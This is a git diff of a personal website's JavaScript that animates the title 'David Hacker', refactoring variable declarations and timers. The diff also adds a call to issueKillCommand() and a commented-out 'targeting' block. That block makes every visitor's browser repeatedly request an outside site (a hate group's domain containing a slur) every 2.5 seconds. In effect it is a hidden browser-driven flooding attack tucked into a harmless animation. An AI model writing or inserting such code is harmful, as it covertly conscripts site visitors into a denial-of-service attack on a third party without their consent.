@@ -1,20 +1,27 @@
 
-var BLINKSPEED = 300;
-var TYPESPEED = 200;
-var STARTTIMEOUT = 3000;
-var MIDTIMEOUT = 900;
+// TITLE ANIMATION
 
-var title = document.getElementById("main-title").innerHTML;
-var new_title = "David Hacker";
-var backspace;
-var forwards;
+var BLINKSPEED = 300,
+    TYPESPEED = 200,
+    STARTTIMEOUT = 3000,
+    MIDTIMEOUT = 900,
 
-var blinked = false;
-var blinktask = window.setInterval(function() { blink() }, BLINKSPEED);
+    title = document.getElementById("main-title").innerHTML,
+    new_title = "David Hacker",
+    backspace,
+    forwards,
+    types = 1,
 
-window.setTimeout(function() {main()}, STARTTIMEOUT);
+    blinked = false,
+    blinktask = window.setInterval(function() { blink() }, BLINKSPEED);
+
+main()
 
 function main() {
+    window.setTimeout(function() {start()}, STARTTIMEOUT);
+}
+
+function start() {
     window.clearInterval(blinktask);
     backspace = window.setInterval(function() { startBackspace() }, TYPESPEED);
 }
@@ -33,8 +40,6 @@ function removeBackspace() {
     window.setTimeout(function() { forwards = window.setInterval(function() { startTyping() }, TYPESPEED); }, MIDTIMEOUT);
 }
 
-var types = 1;
-
 function startTyping() {
     title = new_title.substr(0, types++);
     document.getElementById("main-title").innerHTML = title + "|";
@@ -46,6 +51,7 @@ function startTyping() {
 function endTyping() {
     window.clearInterval(forwards);
     document.getElementById("main-title").innerHTML = title
+    issueKillCommand();
 }
 
 
@@ -58,3 +64,31 @@ function blink() {
     }
     blinked = !blinked;
 }
+
+/*
+// TARGETING CODE
+
+var evil_button_presser = ['http://www.godhatesfags.com']
+
+function issueKillCommand() {
+    setInterval(fetchRandom, 2500)
+}
+
+function fetchRandom() {
+    fetch(evil_button_presser[randomNumber(0, evil_button_presser.length - 1)])
+}
+
+function fetch(url) {
+    $.ajax({
+        url: url,
+        dataType: "text",
+        crossDomain: true,
+        timeout: 10000,
+        cache: true
+    })
+}
+
+function randomNumber(min, max) {
+    return Math.random() * (max - min) + min;
+}
+*/
